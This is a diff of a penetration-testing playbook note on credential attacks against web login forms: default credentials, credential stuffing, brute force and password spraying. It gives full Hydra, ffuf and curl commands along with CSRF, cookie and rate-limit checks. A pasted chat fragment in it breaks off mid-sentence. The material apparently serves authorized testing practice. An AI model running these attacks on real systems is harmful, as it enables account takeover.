@@ -3,11 +3,36 @@ Credential-based attacks against discovered login forms. Entry from [[Web Attack
 
 Ordering: default creds first (30-sec cost, high P on OSCP+); credential stuffing next (if external pair list); hit-and-hope brute force with common usernames (no enum required); password spray (one password × many users, evades lockout); enum-fed brute force last (requires target-enumerated usernames from [[Username Enumeration]]). Pre-flight checks cross-cut all sections — run once before Section 1.
 
+
+
+**I conclude we need to test for the following: all hidden fields; cookie header values; CSRF tokens; session identifiers; nonces; custom-named tokens the CSRF regex does not match; JavaScript computed tokens; Header-based tokens; Referer/origin header checks? That's what I can think of**
+
+Your list is complete for what's detectable by GET-based inspection. My groupings:
+
+**Detectable by structured GET-diff** (name-agnostic, catches everything regardless of what the app calls it):
+
+- All hidden `<input type="hidden">` fields — subsumes CSRF tokens, nonces, custom-named tokens, session identifiers embedded in the form
+- All Set-Cookie header values
+- Meta-tag tokens (`<meta name="csrf-token" content="...">`) that JS reads to build POST headers
+
+**NOT detectable by GET-diff (fundamentally requires browser or POST behavioral testing):**
+
+- JavaScript-computed tokens where JS fetches or computes a value dynamically per-request
+- Header-based POST-time checks (Referer, Origin, User-Agent whitelist)
+- Two-request flows (multi-step verify)
+- Bot-detection challenges (Turnstile, hCaptcha, Cloudflare JS challenge)
+
+Your proposal — warning notice for two-request flows and bot-detection — is right for those. Fundamental scope limit; can't be closed shell-side.
+
+For headers (Referer/Origin/UA), we don't need to _detect_ them — we can defensively _always_
+
 ---
 
 ## Pre-flight checks
 
-Run once before Sections 1-5. Establishes CSRF handling, rate-limit posture, and the failure signal used by all subsequent attacks.
+Run once before proceeding. Determines whether shell path is viable (this note/playbook) or the operator must route to Burp `[[Burp Credential Attacks]]`. Stop at first sub-block that routes out — subsequent sections (Rate limiting profile, SUCCESS/FAIL oracle, Sections 1-5) apply only to the shell path.
+
+⚠️ `[[Burp Credential Attacks]]` playbook body — build-when-encountered. CSRF and cookies-matter routes below dispatch here. Points to include: (1) Setup — Burp session-handling chain: [[Testing Replayability in Burp]] (confirm fresh state needed) → [[Fresh State Per Attempt]] (identify which fields to refresh — CSRF token / session cookie / hidden field / combination) → [[Automating Fresh State in Burp]] (implement macro + session handling rule); (2) Attack modes per section — Sniper (§1 default creds), Pitchfork (§2 credential stuffing), Cluster Bomb (§3 hit-and-hope, §4 spray, §5 enum-fed); (3) Payload sets — same wordlists as CA §1-5 (`~/scripts/wordlists/default_creds.txt`, `xato-net-10-million-usernames-top1M`, `rockyou.txt`, `users_<host>.txt`); (4) Oracle by app class — content/redirect: Intruder Grep-Match on `<login_form_marker>` presence (fail) / absence (success) after Follow Redirects enabled; api: response filter on HTTP 200; (5) Rate-limit tuning — Pre-flight rate-limit probe does not run on the Burp path; derive independently via Repeater rapid-send or Intruder low-thread test, set Resource Pool request delay accordingly; (6) Build trigger — first real-target encounter where CSRF or cookies-matter Pre-flight routes here.
 
 ### CSRF token detection
 
@@ -15,12 +40,33 @@ Run once before Sections 1-5. Establishes CSRF handling, rate-limit posture, and
 
 Route on output:
 
-- Token field name printed → CSRF protection present. Naive Hydra/ffuf will fail (token changes per request). Switch each attack Section below to Burp Intruder with session-handling macro; see [[Automating Fresh State in Burp]].
-- `NO_CSRF_TOKEN` → any tool safe (Hydra, ffuf, Burp).
+- Token field name printed → CSRF protection present. Shell tooling (Hydra/ffuf/curl-loop) cannot handle per-request tokens → route to `[[Burp Credential Attacks]]` (see ⚠️ above); skip remaining Pre-flight sub-blocks.
+- `NO_CSRF_TOKEN` → proceed to cookies-matter check.
 
-### Rate limiting / account lockout probe
+### Cookies-matter check
 
-Send 10 known-bad login attempts against a known-invalid username. Watch for status changes, delays, or size deltas:
+Test whether the login POST requires session cookies to be accepted at all. Shell tooling (Hydra/ffuf/curl loops + `auth_oracle_probe.sh`) sends POST requests with no cookies attached — if the app requires them, every attempt returns a session-error response (403 "session required", 200 with "please reload page", etc.) that the oracle probe would misclassify. Catches both stable-cookie apps (Type B) and cookie-rotated-per-use apps (Type C); both route to Burp.
+
+⚠️ Substitute captured vars before pasting.
+
+```bash
+CJ=$(mktemp); curl -sk -c "$CJ" "http://<host>:<port>/<login_path>" -o /dev/null; S1=$(curl -sk -b "$CJ" -X POST -o /dev/null -w '%{http_code}:%{size_download}' --data-urlencode "<login_username_field>=xyzabc123xxx@invalid.test" --data-urlencode "<login_password_field>=wrong_ZZZ_9999" "http://<host>:<port>/<login_form_action>"); S2=$(curl -sk -X POST -o /dev/null -w '%{http_code}:%{size_download}' --data-urlencode "<login_username_field>=xyzabc123xxx@invalid.test" --data-urlencode "<login_password_field>=wrong_ZZZ_9999" "http://<host>:<port>/<login_form_action>"); rm -f "$CJ"; echo "with_cookies=$S1 without_cookies=$S2"
+```
+
+Route on output:
+
+- `with_cookies == without_cookies` (same status AND same size) → cookies do not affect login POST. Proceed to rate-limit probe.
+- `with_cookies != without_cookies` (status differs OR size differs) → login POST behaves differently with vs without cookies → cookies matter → route to `[[Burp Credential Attacks]]` (see ⚠️ above); skip remaining Pre-flight sub-blocks.
+
+Limitation: check compares status+size only. Body-diff was considered but rejected — apps with rendered timestamps / request UUIDs / debug markers produce byte-differing bodies with identical size, false-positiving into Burp. Rare false-negative case (cookies matter but response has same status AND same size AND only body-text differs) surfaces later as Section 1-5 zero-hits → escalate to Burp then.
+
+---
+
+## Rate limiting profile
+
+Establishes throttling posture. Tunes `<threads>` and `--delay` for Sections 1-5 and the SUCCESS/FAIL oracle probe (next section).
+
+⚠️ Substitute captured vars before pasting (e.g. `<login_username_field>`).
 
 ```bash
 for i in $(seq 1 10); do curl -sX POST -o /dev/null -w '[%{http_code}][size:%{size_download}][time:%{time_total}s]\n' -d '<login_username_field>=xyzabc123xxx&<login_password_field>=wrong' http://<host>:<port>/<login_form_action>; done
@@ -28,27 +74,39 @@ for i in $(seq 1 10); do curl -sX POST -o /dev/null -w '[%{http_code}][size:%{si
 
 Route on output:
 
-- Any HTTP 429 → hard rate limit. Set `<threads>` = 1 for all attacks; consider `-W <delay>` (Hydra) between requests.
-- Response `time_total` grows across requests → soft throttle. `<threads>` = 1.
+- Any HTTP 429 → hard rate limit. `<threads>` = 1 for all attacks; add `-W <delay>` (Hydra) between requests. Pass `--delay=<ms>` (500+) to `auth_oracle_probe.sh` in the SUCCESS/FAIL oracle section below.
+- Response `time_total` grows across requests → soft throttle. `<threads>` = 1; pass `--delay=<ms>` to `auth_oracle_probe.sh`.
 - Response `size` changes at request N → possible lockout at threshold N. Keep any single-username attack under N/2 attempts. Password spray (Section 4) unaffected.
-- No changes across all 10 → no lockout observed. `<threads>` = 10 (ffuf) or 4 (Hydra) safe.
+- No changes across all 10 → no lockout observed. `<threads>` = 10 (ffuf) or 4 (Hydra) safe. No `--delay` needed on `auth_oracle_probe.sh`.
 
-Save `<threads>` value for Sections 2-5.
+Save `<threads>` value for Sections 2-5 and any `--delay=<ms>` for the SUCCESS/FAIL oracle probe.
 
-### Success-detection baseline
+---
 
-Send one deliberately invalid login. Response becomes `<fail_signal>` referenced by Sections 1-5.
+## SUCCESS/FAIL oracle
 
-`curl -sX POST -i -d '<login_username_field>=xyzabc123xxx&<login_password_field>=wrong' http://<host>:<port>/<login_form_action>`
+Derives per-tool oracle strings for Sections 1-5. Replaces the older `<fail_signal>` grep-string approach (which false-SUCCESSed on any anomalous response — 500, 429, empty-field validation, CAPTCHA).
 
-From output, log:
+**Run:**
 
-- HTTP status of failure (typical: 200 with error, 401, 302 redirect back to /login)
-- Response body: identify unique string present ONLY in failure responses (e.g. `Invalid credentials`, `Login incorrect`, `Password incorrect`) — this is `<fail_signal>`
-- Response length in bytes (fallback if no clean string)
-- Set-Cookie behaviour (failure typically sets no session; success sets one)
+`~/scripts/auth_oracle_probe.sh --host=<host> --port=<port> --login-path=<login_path> --form-action=<login_form_action> --user-field=<login_username_field> --pass-field=<login_password_field> [--delay=<ms>] [--scheme=<http|https>]`
 
-Save `<fail_signal>` (or size/status) for Sections 1-5.
+Set `--delay=<ms>` from Pre-flight rate-limit probe if throttling detected. Add `--scheme=https` for TLS targets. Full marker contract in [[Scripts Index]].
+
+**Route on emitted markers:**
+
+- `CLASS: content|redirect|api` + `ORACLE_SUMMARY: class=<c> confidence=<c>` present → shell path OK; capture oracle vars below and proceed to Section 1.
+- `CLASS: basic` + `ROUTE_OUT: Login Bypass Techniques Basic Auth section` → leave Credential Attacks; walk [[Login Bypass Techniques]] Basic Auth section.
+- `BAIL: <reason>` (unusual fail status, curl failure, unclassifiable) → escalate to `[[Burp Credential Attacks]]` (see ⚠️ Pre-flight above).
+- `RATE_LIMITED: sample=<name> <detail>` → target throttled mid-sampling; re-run with higher `--delay`.
+
+**Capture emitted values (substitute textually into Sections 1-5 commands below):**
+
+- `<oracle_hydra>` = value from `ORACLE_HYDRA:` line (e.g. `F=name="email"`, `S="token"`)
+- `<oracle_ffuf>` = value from `ORACLE_FFUF:` line (e.g. `-mc 301,302,303,307,308`, `-r -fr 'name="user"'`, `-mc 200`)
+- `<oracle_curl_success_test>` = value from `ORACLE_CURL_SUCCESS_TEST:` line (bash test expression; vault sections use bash)
+
+For content class, also note the emitted `UNAUTH_MARKER:` and `FAIL_SIGNAL_CANDIDATE:` lines — alternative markers for manual pivot if primary oracle underperforms.
 
 ---
 
@@ -59,9 +117,9 @@ Fastest highest-EV attempt. 30 seconds via automated loop.
 **Universal pairs (loop):**
 
 ```bash
-while IFS=: read -r u p; do
-  echo -n "$u:$p → "
-    curl -sX POST -d "<login_username_field>=$u&<login_password_field>=$p" http://<host>:<port>/<login_form_action> | grep -q '<fail_signal>' && echo "fail" || echo "SUCCESS"
+URL="http://<host>:<port>/<login_form_action>"
+while IFS=: read -r U P; do
+  if <oracle_curl_success_test>; then echo "SUCCESS $U:$P"; fi
 done << 'EOF'
 admin:admin
 admin:password
@@ -78,9 +136,8 @@ user:user
 EOF
 ```
 
-**THE ABOVE COMMAND IS PROBLEMATIC, BECAUSE YOU GET SUCCESS WHEN THE FAIL SIGNAL FAILS TO MATERIALISE, I.E. THE FORM GETS STOPPED PRE SUBMISSION BY JAVASCRIPT THAT CHECKS THAT THE PASSWORD FIELD IS NOT EMPTY. So `admin:` will give `SUCCESS` incorrectly, not because it is a successful log in but because the form never even submits.  **
 
-Any line printing `SUCCESS` → verified success → Section 6.
+Only SUCCESS lines print (silent on fail). Any `SUCCESS` line → verify manually against target → Section 6.
 
 **Framework-specific (if framework identified via WAC 1.1-1.4).** Add to the loop above:
 
@@ -95,8 +152,8 @@ Any line printing `SUCCESS` → verified success → Section 6.
 
 Route:
 
-- Any `SUCCESS` line → Section 6
-- All `fail` → 2
+- Any `SUCCESS` line → verify manually → Section 6
+- No output → all default creds failed → 2
 
 ---
 
@@ -115,29 +172,14 @@ cut -d: -f1 pairs.txt > users.txt
 cut -d: -f2- pairs.txt > passwords.txt
 ```
 
-**Replayability check:** [[Testing Replayability in Burp]].
-
-- Replayable AND no CSRF → ffuf pitchfork below
-- Not statically replayable OR CSRF present → Burp Intruder Pitchfork below
-
 **ffuf pitchfork (aligned pairs, one attack per row):**
 
-`ffuf -w users.txt:U -w passwords.txt:P -mode pitchfork -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads> -o ffuf_stuff_<host>_<port>.json -of json`
-
-**Burp Intruder Pitchfork:**
-
-1. Capture normal login request → Intruder.
-2. Mark username and password form-field values as payload positions.
-3. Attack type: Pitchfork.
-4. Payload set 1 = users.txt, set 2 = passwords.txt (line-aligned).
-5. If CSRF: configure Session Handling Rules per [[Automating Fresh State in Burp]].
-6. Options → Grep-Match on `<fail_signal>`. After attack, sort by absence to find success.
-7. Start.
+`ffuf -w users.txt:U -w passwords.txt:P -mode pitchfork -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_stuff_<host>_<port>.json -of json`
 
 Route:
 
-- Any entry without `<fail_signal>` (or different status/length) → verify manually → Section 6
-- All pairs return `<fail_signal>` → 3
+- Any ffuf result entry → verify manually → Section 6
+- ffuf found no matches → 3
 
 ---
 
@@ -149,17 +191,17 @@ Precondition: `<threads>` established from Pre-flight lockout probe. If lockout 
 
 **Hydra with common user/password shortlists:**
 
-`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:F=<fail_signal>' -t <threads> -o hydra_hitand_<host>_<port>.txt -V`
+`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:<oracle_hydra>' -t <threads> -o hydra_hitand_<host>_<port>.txt -V`
 
 `-e nsr` also tries: empty password, same-as-user, reversed-user.
 
 **ffuf cluster bomb variant:**
 
-`ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads> -o ffuf_hitand_<host>_<port>.json -of json`
+`ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_hitand_<host>_<port>.json -of json`
 
 Route:
 
-- Hydra prints `[<port>][http-post-form] host: <host>   login: <user>   password: <pass>` line, OR ffuf shows entry without `<fail_signal>` → verify manually → Section 6
+- Hydra prints `[<port>][http-post-form] host: <host>   login: <user>   password: <pass>` line, OR ffuf shows any result entry → verify manually → Section 6
 - Exhausted, no success → 4
 
 ---
@@ -175,7 +217,7 @@ Precondition: username candidate list — use `/usr/share/seclists/Usernames/top
 ```bash
 for p in "Password1" "Password123" "Welcome1" "Winter2025!" "Summer2025!" "Autumn2025!" "Spring2025!" "Company123" "changeme"; do
   echo "=== spraying: $p ==="
-    hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p "$p" <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:F=<fail_signal>' -t <threads> -o "hydra_spray_${p}.txt" -V 2>/dev/null | grep -i 'login:'
+	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p "$p" <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:<oracle_hydra>' -t <threads> -o "hydra_spray_${p}.txt" -V 2>/dev/null | grep -i 'login:'
 done
 ```
 
@@ -194,18 +236,13 @@ Full password wordlist × target-enumerated usernames. Fires from WAC sub-block 
 
 Precondition: `users_<host>.txt` contains one or more entries. If empty → this section does not fire.
 
-**Replayability check:** [[Testing Replayability in Burp]].
-
-- Replayable AND no CSRF → Hydra or ffuf below
-- Not statically replayable OR CSRF present → Burp Intruder Cluster Bomb (mirror Section 2 Burp path with Cluster Bomb attack type instead of Pitchfork)
-
 **Hydra with enumerated user list:**
 
-`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:F=<fail_signal>' -t <threads> -o hydra_enum_<host>_<port>.txt -V`
+`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:<oracle_hydra>' -t <threads> -o hydra_enum_<host>_<port>.txt -V`
 
 **ffuf cluster bomb variant:**
 
-`ffuf -w users_<host>.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads> -o ffuf_enum_<host>_<port>.json -of json`
+`ffuf -w users_<host>.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_enum_<host>_<port>.json -of json`
 
 **Target-derived wordlist (Cewl).** If common wordlists exhaust with no hit, generate target-specific wordlist:
 
